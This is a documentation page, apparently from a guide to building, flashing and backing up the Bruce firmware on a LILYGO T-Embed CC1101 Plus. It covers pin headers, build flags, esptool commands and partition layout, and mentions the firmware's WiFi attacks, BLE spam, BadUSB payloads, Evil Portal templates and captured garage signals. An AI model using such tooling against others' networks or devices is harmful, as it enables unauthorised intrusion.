   - Add: https://raw.githubusercontent.com/espressif/arduino-esp32/gh-pages/package_esp32_index.json
   - Tools → Board → Board Manager → search "esp32" → Install "esp32 by Espressif Systems"

3. Select board:
   - Tools → Board → ESP32S3 Dev Module

4. Configure board settings:
   - Flash Mode: QIO 80MHz
   - Flash Size: 16MB (128Mb)
   - Partition Scheme: Custom (use Bruce's partitions.csv)
   - PSRAM: OPI PSRAM
   - USB Mode: Hardware CDC and JTAG
   - Upload Speed: 921600

5. Install required libraries via Library Manager:
   - TFT_eSPI
   - IRremoteESP8266
   - ArduinoJson
   - (see Bruce README for complete list)

6. Open src/main.cpp as a sketch
7. Sketch → Verify/Compile
8. Sketch → Upload
```

{: .warning }
> Building with Arduino IDE requires manually installing all library dependencies and configuring board settings. PlatformIO handles all of this automatically via `platformio.ini`. Use Arduino IDE only if you have a specific reason not to use PlatformIO.

---

### Board Configuration Files

The board configuration files define how Bruce maps to the T-Embed's specific hardware.

**`boards/t-embed-cc1101/pins.h`** — GPIO pin assignments:

```cpp
#pragma once

// Display (ST7789 1.9" 170x320)
#define TFT_CS    10
#define TFT_DC    13
#define TFT_RST   9
#define TFT_MOSI  11
#define TFT_SCLK  12
#define TFT_BL    15    // Backlight PWM

// Rotary Encoder
#define ENCODER_A   1
#define ENCODER_B   2
#define ENCODER_BTN 0   // Push button (active low)

// CC1101 Sub-GHz Radio (SPI)
#define CC1101_CS   14
#define CC1101_GDO0 21
#define CC1101_GDO2 16
#define CC1101_MOSI 11  // Shared SPI bus with display
#define CC1101_MISO 43
#define CC1101_SCLK 12  // Shared SPI bus with display

// Infrared
#define IR_TX  44       // IR transmit LED
#define IR_RX  42       // IR receiver

// Speaker
#define SPEAKER_PIN 46

// Power / Battery
#define BAT_ADC   4     // Battery voltage ADC

// GPIO Expansion Header
#define GPIO_SDA  18    // I2C data
#define GPIO_SCL  8     // I2C clock
#define GPIO_3    3     // General purpose / SPI MOSI (NRF24)
#define GPIO_4    4     // General purpose / SPI MISO (NRF24)
#define GPIO_5    5     // General purpose / SPI SCK (NRF24)
#define GPIO_6    6     // General purpose / NRF24 CE
#define GPIO_7    7     // General purpose / NRF24 CSN
```

{: .note }
> Pin assignments may vary between T-Embed hardware revisions. Always verify against the silkscreen on your specific board and the LILYGO official documentation.

**`boards/t-embed-cc1101/board_config.h`** — Feature and hardware flags:

```cpp
#pragma once

// Hardware features
#define HAS_CC1101      1
#define HAS_IR_TX       1
#define HAS_IR_RX       1
#define HAS_SPEAKER     1
#define HAS_ENCODER     1
#define HAS_BATTERY_ADC 1
#define HAS_USB_OTG     1

// Optional hardware (via GPIO header)
#define HAS_NRF24       0   // Set to 1 if NRF24L01+ connected
#define HAS_RFID        0   // Set to 1 if RFID module connected

// Display configuration
#define DISPLAY_WIDTH   170
#define DISPLAY_HEIGHT  320
#define DISPLAY_DRIVER  ST7789
#define DISPLAY_ROTATION 1

// CC1101 configuration
#define CC1101_FREQUENCY_MIN 300000000  // 300 MHz
#define CC1101_FREQUENCY_MAX 928000000  // 928 MHz
#define DEFAULT_SUBGHZ_FREQUENCY 433920000

// WiFi
#define WIFI_CHANNEL_MIN 1
#define WIFI_CHANNEL_MAX 14

// BadUSB
#define USB_VID 0x303A  // Espressif VID
#define USB_PID 0x1001
#define USB_MANUFACTURER "LILYGO"
#define USB_PRODUCT "T-Embed"
```

---

### Environment Variables and Build Flags

Bruce's `platformio.ini` defines build environments with specific flags:

```ini
; platformio.ini (T-Embed CC1101 section)

[env:t-embed-cc1101]
platform = espressif32@6.5.0
board = esp32-s3-devkitc-1
framework = arduino

; Flash configuration
board_build.flash_mode = qio
board_build.flash_size = 16MB
board_build.partitions = boards/t-embed-cc1101/partitions.csv

; PSRAM
board_build.arduino.memory_type = qio_opi

; Build flags
build_flags =
    -DBOARD_T_EMBED_CC1101
    -DARDUINO_USB_MODE=1
    -DARDUINO_USB_CDC_ON_BOOT=1
    -DUSER_SETUP_LOADED        ; TFT_eSPI custom config
    -DST7789_DRIVER
    -DTFT_WIDTH=170
    -DTFT_HEIGHT=320
    -DTFT_MOSI=${pins.TFT_MOSI}
    -DTFT_SCLK=${pins.TFT_SCLK}
    -DTFT_CS=${pins.TFT_CS}
    -DTFT_DC=${pins.TFT_DC}
    -DTFT_RST=${pins.TFT_RST}
    -DSPI_FREQUENCY=40000000

; Upload configuration
upload_speed = 921600
monitor_speed = 115200

; Filesystem
board_build.filesystem = spiffs
board_build.spiffs_size = 1MB

; Library dependencies
lib_deps =
    bodmer/TFT_eSPI
    crankyoldgit/IRremoteESP8266
    bblanchon/ArduinoJson
    adafruit/Adafruit NeoPixel
```

**Common build flags you may want to modify:**

| Flag | Effect |
|:-----|:-------|
| `-DBOARD_T_EMBED_CC1101` | Selects T-Embed board configuration |
| `-DENABLE_WIFI_ATTACKS=0` | Disable WiFi attack features (for legal compliance) |
| `-DENABLE_BLE_SPAM=0` | Disable BLE spam features |
| `-DDEFAULT_BRIGHTNESS=128` | Set default display brightness (0-255) |
| `-DDEBUG_MODE=1` | Enable serial debug output |
| `-DDISABLE_OTA=1` | Remove OTA update capability (smaller binary) |

---

### Contributing Back to the Project

If you build a feature that would benefit the community:

```bash
# 1. Fork the repository on GitHub
gh repo fork pr3y/Bruce --clone

# 2. Create a feature branch
cd Bruce
git checkout -b feature/my-new-feature

# 3. Make your changes
# ... edit files ...

# 4. Test your changes
pio run -e t-embed-cc1101
pio run -e t-embed-cc1101 --target upload

# 5. Commit with conventional commits
git add -A
git commit -m "feat: add my new feature for T-Embed CC1101"

# 6. Push and create a pull request
git push origin feature/my-new-feature
gh pr create --title "feat: add my new feature" \
  --body "Description of the feature, testing performed, etc."
```

{: .tip }
> Bruce follows conventional commit format. Prefix your commits with `feat:`, `fix:`, `refactor:`, `docs:`, or `chore:`. Include a clear description of what your change does and how you tested it.

---

## Firmware Management

### Keeping Multiple Firmware Binaries

It is useful to maintain a local collection of firmware binaries for quick switching:

```bash
# Create an organized firmware directory
mkdir -p ~/t-embed-firmware/{bruce,esp-flipper,marauder,factory,custom}

# Download and organize
# After building or downloading each firmware:
cp Bruce/.pio/build/t-embed-cc1101/firmware.bin \
   ~/t-embed-firmware/bruce/bruce-v1.6.0.bin

cp esp-flipper-t-embed.bin \
   ~/t-embed-firmware/esp-flipper/esp-flipper-v2.1.bin

cp esp32_marauder_t_embed.bin \
   ~/t-embed-firmware/marauder/marauder-v1.0.bin

# List your collection
ls -lah ~/t-embed-firmware/*/

# Expected:
# ~/t-embed-firmware/bruce/:
# -rw-r--r--  1.9M  bruce-v1.5.0.bin
# -rw-r--r--  2.0M  bruce-v1.6.0.bin
#
# ~/t-embed-firmware/esp-flipper/:
# -rw-r--r--  1.7M  esp-flipper-v2.1.bin
#
# ~/t-embed-firmware/factory/:
# -rw-r--r--  16M   factory_backup.bin
# ...
```

---

### Switching Between Firmware

**Quick-switch script:**

```bash
#!/bin/bash
# flash-t-embed.sh — Quick firmware switcher for T-Embed CC1101 Plus

FIRMWARE_DIR="$HOME/t-embed-firmware"
PORT=$(ls /dev/cu.usbmodem* 2>/dev/null | head -1)

if [ -z "$PORT" ]; then
    echo "ERROR: No T-Embed detected. Connect via USB-C and try again."
    echo "  Tip: Hold BOOT button while connecting if device is bricked."
    exit 1
fi

echo "T-Embed detected on: $PORT"
echo ""
echo "Available firmware:"
echo "  1) Bruce (latest)"
echo "  2) ESP-Flipper"
echo "  3) Marauder"
echo "  4) Factory"
echo "  5) Custom path"
echo ""
read -p "Select firmware [1-5]: " choice

case $choice in
    1) BIN=$(ls -t "$FIRMWARE_DIR/bruce/"*.bin | head -1) ;;
    2) BIN=$(ls -t "$FIRMWARE_DIR/esp-flipper/"*.bin | head -1) ;;
    3) BIN=$(ls -t "$FIRMWARE_DIR/marauder/"*.bin | head -1) ;;
    4) BIN=$(ls -t "$FIRMWARE_DIR/factory/"*.bin | head -1) ;;
    5) read -p "Enter full path to .bin: " BIN ;;
    *) echo "Invalid selection"; exit 1 ;;
esac

if [ ! -f "$BIN" ]; then
    echo "ERROR: Firmware file not found: $BIN"
    exit 1
fi

echo "Flashing: $BIN"
echo "Port:     $PORT"
read -p "Continue? [y/N]: " confirm
[ "$confirm" = "y" ] || exit 0

esptool.py --chip esp32s3 --port "$PORT" \
    --baud 921600 write_flash \
    --flash_mode dio --flash_freq 80m --flash_size 16MB \
    0x0 "$BIN"

echo ""
echo "Flash complete. Device will reboot automatically."
```

```bash
# Make executable and run
chmod +x flash-t-embed.sh
./flash-t-embed.sh

# Expected output:
# T-Embed detected on: /dev/cu.usbmodem14101
#
# Available firmware:
#   1) Bruce (latest)
#   2) ESP-Flipper
#   3) Marauder
#   4) Factory
#   5) Custom path
#
# Select firmware [1-5]: 1
# Flashing: /Users/you/t-embed-firmware/bruce/bruce-v1.6.0.bin
# Port:     /dev/cu.usbmodem14101
# Continue? [y/N]: y
# ...
# Flash complete. Device will reboot automatically.
```

---

### Backup and Restore

**Full flash backup (complete device image):**

```bash
# Read the entire 16MB flash to a backup file
esptool.py --chip esp32s3 --port /dev/cu.usbmodem* \
  read_flash 0x0 0x1000000 backup_full_$(date +%Y%m%d).bin

# Expected output:
# esptool.py v4.7.0
# Serial port /dev/cu.usbmodem14101
# Connecting...
# Detecting chip type... ESP32-S3
# Read 16777216 bytes at 0x00000000 in 145.6 seconds (921.6 kbit/s)...

# Verify the backup
ls -lh backup_full_*.bin
# -rw-r--r--  16M  backup_full_20260228.bin
```

**Restore from backup:**

```bash
# Write the full flash image back
esptool.py --chip esp32s3 --port /dev/cu.usbmodem* \
  --baud 921600 write_flash \
  --flash_mode dio --flash_freq 80m --flash_size 16MB \
  0x0 backup_full_20260228.bin

# This restores EVERYTHING: bootloader, partition table,
# application, filesystem, NVS, and all saved data.
```

**SPIFFS-only backup (saved signals, payloads, configs):**

```bash
# Read only the SPIFFS partition (offset and size vary — check partitions.csv)
# Typical SPIFFS offset for Bruce: 0x310000, size: 0x100000 (1MB)
esptool.py --chip esp32s3 --port /dev/cu.usbmodem* \
  read_flash 0x310000 0x100000 spiffs_backup_$(date +%Y%m%d).bin

# Restore SPIFFS only
esptool.py --chip esp32s3 --port /dev/cu.usbmodem* \
  --baud 921600 write_flash 0x310000 spiffs_backup_20260228.bin
```

{: .tip }
> Always back up your SPIFFS partition before switching firmware. Different firmware may use different SPIFFS layouts or partition offsets, and switching can erase your saved signals and payloads.

---

### Version Tracking

Keep a log of what is flashed and when:

```bash
# Create a version log
cat >> ~/t-embed-firmware/flash_log.txt << EOF
$(date '+%Y-%m-%d %H:%M') | Bruce v1.6.0 | bruce-v1.6.0.bin | OTA update from v1.5.0
EOF

# View flash history
cat ~/t-embed-firmware/flash_log.txt
# 2026-02-15 14:30 | Factory | factory_backup.bin | Initial backup
# 2026-02-15 14:35 | Bruce v1.5.0 | bruce-v1.5.0.bin | First Bruce install
# 2026-02-22 10:00 | Marauder v1.0 | marauder-v1.0.bin | WiFi testing session
# 2026-02-22 18:00 | Bruce v1.5.0 | bruce-v1.5.0.bin | Restored for sub-GHz work
# 2026-02-28 09:00 | Bruce v1.6.0 | bruce-v1.6.0.bin | OTA update from v1.5.0
```

---

### OTA vs USB Flashing Comparison

| Aspect | OTA (Over-the-Air) | USB (esptool) |
|:-------|:-------------------|:--------------|
| **Requires** | WiFi connection + current firmware running | USB-C cable + computer |
| **Speed** | Slower (WiFi download + flash) | Faster (direct serial) |
| **Can unbrick** | No — requires working firmware | Yes — works even if firmware is corrupt |
| **Partition safety** | Only updates app partition | Can write any partition |
| **SPIFFS preserved** | Yes (only app partition updated) | Depends on flash command |
| **Bootloader updated** | No | Yes (if included in flash) |
| **Convenience** | Very convenient — no cable needed | Requires cable and computer |
| **Failure risk** | Low (rollback if interrupted) | Medium (partial write = brick) |
| **Recovery from failure** | Automatic rollback | Hold BOOT button + re-flash |
| **Version flexibility** | Latest release only | Any binary file |

{: .tip }
> **Use OTA for routine updates** when you are running Bruce and just want the latest version. **Use USB flashing** when switching firmware entirely, recovering from a brick, or flashing custom builds.

---

## Firmware File Formats

### .bin — Flash Image Format

The `.bin` file is a raw binary image that maps directly to flash memory. ESP32-S3 firmware is typically distributed as one or more `.bin` files that correspond to specific flash addresses.

**Single merged binary:**

Some firmware distributions provide a single `.bin` that includes the bootloader, partition table, and application merged into one file. This is flashed at address `0x0`.

```bash
# Flash a merged binary
esptool.py --chip esp32s3 --port /dev/cu.usbmodem* \
  write_flash 0x0 firmware_merged.bin
```

**Separate binaries:**

Other distributions provide separate files for each component, flashed at their respective offsets.

```bash
# Flash separate components
esptool.py --chip esp32s3 --port /dev/cu.usbmodem* \
  write_flash \
  0x0000  bootloader.bin \
  0x8000  partitions.bin \
  0xe000  boot_app0.bin \
  0x10000 firmware.bin
```

---

### Partition Table Layout

The ESP32-S3's flash memory is divided into partitions defined by a partition table. Bruce uses a custom layout optimized for the T-Embed's 16MB flash.

**Typical Bruce partition table (`partitions.csv`):**

```
# Name,     Type,  SubType, Offset,    Size,      Flags
nvs,        data,  nvs,     0x9000,    0x5000,
otadata,    data,  ota,     0xe000,    0x2000,
app0,       app,   ota_0,   0x10000,   0x300000,
spiffs,     data,  spiffs,  0x310000,  0x100000,
coredump,   data,  coredump,0x410000,  0x10000,
```

**Visual flash memory map:**

```
Flash Address    Partition       Size      Description
────────────────────────────────────────────────────────────
0x000000         Bootloader      16 KB     Second-stage bootloader
0x008000         Partition Table 4 KB      Defines partition layout
0x009000         NVS             20 KB     Non-volatile storage (WiFi creds, settings)
0x00E000         OTA Data        8 KB      OTA boot selection flags
0x010000         App (OTA_0)     3 MB      Main application firmware
0x310000         SPIFFS          1 MB      Filesystem (signals, payloads, configs)
0x410000         Core Dump       64 KB     Crash dump storage
0x420000         (Free)          ~11.8 MB  Unused flash space
────────────────────────────────────────────────────────────
                 Total Flash:    16 MB
```

| Partition | Purpose |
|:----------|:--------|
| **Bootloader** | Initializes hardware, loads partition table, launches application. Written at `0x0`. Updated only via USB flash (not OTA). |
| **Partition Table** | Defines the layout of all other partitions. Tells the bootloader where to find the application and data. |
| **NVS (Non-Volatile Storage)** | Key-value store for persistent settings: WiFi credentials, calibration data, user preferences. Survives firmware updates. |
| **OTA Data** | Tracks which OTA partition (ota_0 or ota_1) contains the active firmware. Enables rollback on failed OTA. |
| **App (OTA_0)** | The main firmware application. This is what gets updated during OTA or USB flash. 3 MB allows for a feature-rich firmware. |
| **SPIFFS** | Filesystem partition for user data: captured signals, BadUSB payloads, Evil Portal templates, IR codes, configuration files. |
| **Core Dump** | Stores crash information for debugging. When the firmware crashes, the stack trace and registers are written here for later analysis. |

{: .note }
> The partition layout can vary between firmware versions and different firmware projects. Always check the specific `partitions.csv` for the firmware you are using before attempting manual partition-level operations.

---

### Bootloader, Application, and Storage Partitions

**Bootloader (`bootloader.bin` at `0x0`):**

The ESP32-S3 second-stage bootloader:
- Initializes CPU clocks, flash, and PSRAM
- Reads the partition table to locate the application
- Checks OTA data to determine which app partition to boot
- Validates the application image (checksum/signature)
- Jumps to the application entry point

```bash
# The bootloader is typically compiled by the ESP-IDF/Arduino framework
# You rarely need to modify it, but you can rebuild it:
pio run -e t-embed-cc1101 --target bootloader
# Output: .pio/build/t-embed-cc1101/bootloader.bin
```

**Application partition (`firmware.bin` at `0x10000`):**

This is the actual Bruce firmware — all the menu code, radio drivers, WiFi attacks, BLE tools, IR logic, and USB HID implementation. At ~2-3 MB, it is by far the largest partition.

**SPIFFS / LittleFS filesystem (`spiffs.bin` at `0x310000`):**

The SPIFFS (SPI Flash File System) partition provides a flat filesystem for storing user data.

```bash
# Build the SPIFFS image from the data/ directory
pio run -e t-embed-cc1101 --target buildfs
# Output: .pio/build/t-embed-cc1101/spiffs.bin

# Upload the SPIFFS image to the device
pio run -e t-embed-cc1101 --target uploadfs
```

**SPIFFS characteristics:**
- Flat filesystem (no true directory hierarchy — paths are stored as flat strings with `/` separators)
- Wear-leveling built in (extends flash lifespan)
- No journaling — power loss during write can corrupt files
- Maximum filename length: 32 characters
- Maximum file size: limited by partition size
- Read speed: fast. Write speed: moderate (flash erase cycles)

**LittleFS alternative:**

Some Bruce builds use LittleFS instead of SPIFFS. LittleFS offers:
- True directory support
- Power-loss resilience (journaled writes)
- Better performance for small files
- Lower RAM usage

```ini
# To switch to LittleFS in platformio.ini:
board_build.filesystem = littlefs
```

{: .warning }
> SPIFFS and LittleFS are **not interchangeable**. If you flash a firmware built with LittleFS onto a device with a SPIFFS partition (or vice versa), the filesystem will appear empty or corrupt. You will need to re-upload the filesystem image matching the new filesystem type.

---

### Inspecting Filesystem Contents from PC

You can extract and examine the SPIFFS/LittleFS image on your computer:

```bash
# Read the SPIFFS partition from the device
esptool.py --chip esp32s3 --port /dev/cu.usbmodem* \
  read_flash 0x310000 0x100000 spiffs_dump.bin

# Install mkspiffs tool (if not already available)
# PlatformIO includes it, or install separately:
pip install mkspiffs

# List files in the SPIFFS image
mkspiffs --list -b 4096 -p 256 -s 0x100000 spiffs_dump.bin

# Expected output:
#      1234  /bruce/subghz/captures/garage_433.sub
#       567  /bruce/ir/captures/tv_power.ir
#       890  /bruce/badusb/payloads/rickroll.txt
#      2345  /bruce/config/settings.json
#       456  /bruce/wifi/portals/hotel.html

# Extract all files
mkspiffs --unpack ./spiffs_extracted -b 4096 -p 256 -s 0x100000 spiffs_dump.bin

# Browse extracted files
ls -R ./spiffs_extracted/bruce/
```

{: .tip }
> Extracting the SPIFFS image is an excellent way to back up all your captured signals, payloads, and configurations. You can also modify files on your PC and re-pack them into a new SPIFFS image for upload.

---

## Summary

| Firmware | Best For | Sub-GHz | WiFi | BLE | IR | BadUSB |
|:---------|:---------|:--------|:-----|:----|:---|:-------|
| **Bruce** | All-around multi-tool | Full | Full | Full | Full | Full |
| **ESP-Flipper** | Flipper Zero familiarity | Full | Basic | Basic | Full | Basic |
| **Marauder** | WiFi-focused operations | None | Advanced | Yes | None | None |
| **Factory** | Hardware verification only | Demo | Demo | No | Demo | No |
| **Custom** | Your specific needs | You decide | You decide | You decide | You decide | You decide |

{: .tip }
> **Start with Bruce.** It offers the broadest feature set, the most active development, and the best support for the T-Embed CC1101 Plus hardware. If you need specialized WiFi capabilities, Marauder is an excellent secondary firmware. Keep both binaries on hand and switch as needed using the quick-flash script above.
